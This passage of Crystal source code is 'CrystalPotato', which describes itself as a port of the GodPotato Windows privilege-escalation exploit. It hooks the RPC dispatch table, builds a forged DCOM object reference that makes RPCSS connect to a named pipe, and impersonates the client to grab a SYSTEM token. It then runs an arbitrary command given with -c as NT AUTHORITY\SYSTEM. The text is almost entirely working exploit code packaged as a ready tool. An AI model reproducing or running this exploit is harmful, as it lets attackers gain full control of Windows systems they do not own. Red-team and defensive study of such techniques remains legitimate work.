    is_connect = LibC.ConnectNamedPipe(pipe_handle, Pointer(Void).null)
    last_err = LibC.GetLastError

    if (is_connect != 0 || last_err == ERROR_PIPE_CONNECTED) && @is_started
      log "[*] Pipe Connected!"

      if LibC.ImpersonateNamedPipeClient(pipe_handle) != 0
        imp_token = Pointer(Void).null
        ok = LibC.OpenThreadToken(
          LibC.GetCurrentThread,
          TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
          1, pointerof(imp_token))
        imp_token = Pointer(Void).null if ok == 0

        current_sid = imp_token.null? ? "Unknown" : (get_token_sid(imp_token) || "Unknown")
        imp_level = imp_token.null? ? -1 : get_impersonation_level(imp_token)

        log "[*] CurrentUser: #{current_sid}"
        log "[*] CurrentsImpersonationLevel: #{imp_level}"

        LibC.CloseHandle(imp_token) unless imp_token.null?

        system_token = find_system_token(@log)
        if system_token
          @system_token = system_token
          log "[*] Find System Token : True"
        else
          log "[*] Find System Token : False"
        end

        LibC.RevertToSelf
      else
        log "[!] ImpersonateNamedPipeClient fail error:#{LibC.GetLastError}"
      end
    else
      log "[!] ConnectNamedPipe failed is_connect=#{is_connect} err=#{last_err}"
    end

    LibC.CloseHandle(pipe_handle)
  end

  def start
    raise "Must hook RPC first" unless @is_hooked
    return if @is_started

    @is_started = true
    PipeServerBridge.ctx = self
    tid = 0_u32
    @thread_handle = LibC.CreateThread(
      Pointer(Void).null, 0_u64,
      PIPE_SERVER_THREAD_PROC,
      Pointer(Void).null,
      0_u32, pointerof(tid))
    puts "[*] Start PipeServer"
  end

  def join_pipe_thread
    unless @thread_handle.null?
      LibC.WaitForSingleObject(@thread_handle, INFINITE_WAIT)
      LibC.CloseHandle(@thread_handle)
    end
    @log.each { |msg| puts msg }
    @log.clear
  end

  def restore
    if @is_hooked && @use_protseq_function_ptr != 0
      Pointer(UInt64).new(@dispatch_table_ptr).value = @use_protseq_function_ptr
      @is_hooked = false
    end
  end

  def stop
    if @is_started
      @is_started = false
      begin
        sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32)
        pipe_name_w = @server_pipe.to_utf16
        pipe_client = LibC.CreateFileW(
          pipe_name_w.to_unsafe,
          0xC0000000_u32,
          0x03_u32,
          pointerof(sa).as(Pointer(LibC::SECURITY_ATTRIBUTES)),
          3_u32,
          0_u32, Pointer(Void).null)
        if pipe_client != INVALID_HANDLE_VALUE
          data = StaticArray(UInt8, 1).new(0xAA_u8)
          written = 0_u32
          LibC.WriteFile(pipe_client, data.to_unsafe.as(Pointer(Void)), 1_u32, pointerof(written), Pointer(LibC::OVERLAPPED).null)
          LibC.CloseHandle(pipe_client)
        end
      rescue
      end
    end
  end

  def get_token : Pointer(Void)?
    @system_token
  end
end


# ─────────────── DCOM Trigger ───────────────────────────
def get_local_objref : ObjRef
  fake_obj = Pointer(Void).null
  hr = Ole32.CreateStreamOnHGlobal(Pointer(Void).null, 1, pointerof(fake_obj))
  raise "CreateStreamOnHGlobal (fake) failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0

  hglobal = LibC.GlobalAlloc(0x0042_u32, 4096_u64)
  raise "GlobalAlloc failed" if hglobal.null?

  out_stream = Pointer(Void).null
  hr = Ole32.CreateStreamOnHGlobal(hglobal, 0, pointerof(out_stream))
  raise "CreateStreamOnHGlobal (out) failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0

  iid = IID_IUNKNOWN.dup
  hr = Ole32.CoMarshalInterface(
    out_stream, iid.to_unsafe.as(Pointer(Void)), fake_obj,
    2_u32, Pointer(Void).null, 0_u32)
  raise "CoMarshalInterface failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0

  ptr = LibC.GlobalLock(hglobal)
  data = Bytes.new(4096)
  data.to_unsafe.copy_from(ptr.as(Pointer(UInt8)), 4096)
  LibC.GlobalUnlock(hglobal)

  ObjRef.parse(data)
end

def trigger_dcom(ctx : GodPotatoContext)
  tmp_objref = get_local_objref

  guid_hex = tmp_objref.guid.hexstring
  ipid_hex = tmp_objref.standard_objref.ipid.hexstring
  puts "[*] DCOM obj GUID: #{guid_hex[0, 8]}-#{guid_hex[8, 4]}-#{guid_hex[12, 4]}-#{guid_hex[16, 4]}-#{guid_hex[20, 12]}"
  puts "[*] DCOM obj IPID: #{ipid_hex[0, 8]}-#{ipid_hex[8, 4]}-#{ipid_hex[12, 4]}-#{ipid_hex[16, 4]}-#{ipid_hex[20, 12]}"
  puts "[*] DCOM obj OXID: 0x#{tmp_objref.standard_objref.oxid.to_s(16)}"
  puts "[*] DCOM obj OID: 0x#{tmp_objref.standard_objref.oid.to_s(16)}"

  crafted_dsa = DualStringArray.new(
    StringBinding.new(EPM_PROTOCOL_TCP, "127.0.0.1"),
    SecurityBinding.new(0x0a_u16, 0xffff_u16))

  crafted_objref = ObjRef.new(
    IID_IUNKNOWN.dup,
    StandardObjRef.new(
      0_u32, 1_u32,
      tmp_objref.standard_objref.oxid,
      tmp_objref.standard_objref.oid,
      tmp_objref.standard_objref.ipid.dup))

  data = crafted_objref.get_bytes(crafted_dsa)
  puts "[*] Marshal Object bytes len: #{data.size}"

  hglobal = LibC.GlobalAlloc(0x0002_u32, data.size.to_u64)
  raise "GlobalAlloc failed for unmarshal" if hglobal.null?
  ptr = LibC.GlobalLock(hglobal)
  ptr.as(Pointer(UInt8)).copy_from(data.to_unsafe, data.size)
  LibC.GlobalUnlock(hglobal)

  stream = Pointer(Void).null
  hr = Ole32.CreateStreamOnHGlobal(hglobal, 1, pointerof(stream))
  raise "CreateStreamOnHGlobal for unmarshal failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0

  ppv = Pointer(Void).null
  iid = IID_IUNKNOWN.dup
  puts "[*] UnMarshal Object"
  puts "[*] Trigger RPCSS"
  hr = Ole32.CoUnmarshalInterface(stream, iid.to_unsafe.as(Pointer(Void)), pointerof(ppv))
  puts "[*] UnmarshalObject: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
end


# ─────────────── Main ───────────────────────────────────
def main
  command = ""
  pipe_name = "GodPotato"

  OptionParser.parse do |parser|
    parser.banner = "Usage: CrystalPotato.exe [options]"
    parser.on("-c CMD", "--cmd=CMD", "Command to execute as SYSTEM") { |c| command = c }
    parser.on("-p NAME", "--pipe=NAME", "Custom pipe name (default: GodPotato)") { |p| pipe_name = p }
    parser.on("-h", "--help", "Show help") { puts parser; exit }
  end

  if command.empty?
    STDERR.puts "[!] -c/--cmd is required"
    exit(1)
  end

  puts "CrystalPotato - a GodPotato port"

  hr = Ole32.CoInitializeEx(Pointer(Void).null, 0_u32)
  if hr < 0
    puts "[!] CoInitializeEx failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
    return
  end

  begin
    ctx = GodPotatoContext.new(pipe_name)

    puts "[*] CombaseModule: 0x#{ctx.combase_module.to_s(16)}"
    puts "[*] DispatchTable: 0x#{ctx.dispatch_table_ptr.to_s(16)}"
    puts "[*] UseProtseqFunction: 0x#{ctx.use_protseq_function_ptr.to_s(16)}"
    puts "[*] UseProtseqFunctionParamCount: #{ctx.use_protseq_param_count}"

    ctx.hook_rpc
    ctx.start

    LibC.Sleep(500_u32)

    begin
      trigger_dcom(ctx)
    rescue ex
      puts "[!] Trigger error: #{ex.message}" unless ex.message == "Arithmetic overflow"
    end

    ctx.join_pipe_thread

    system_token = ctx.get_token
    if system_token
      puts "[*] CurrentUser: NT AUTHORITY\\SYSTEM"
      create_process_read_output(system_token, command)
    else
      puts "[!] Failed to impersonate security context token"
    end

    ctx.restore
    ctx.stop
  rescue ex
    puts "[!] #{ex.message}"
  end

  Ole32.CoUninitialize
end


main
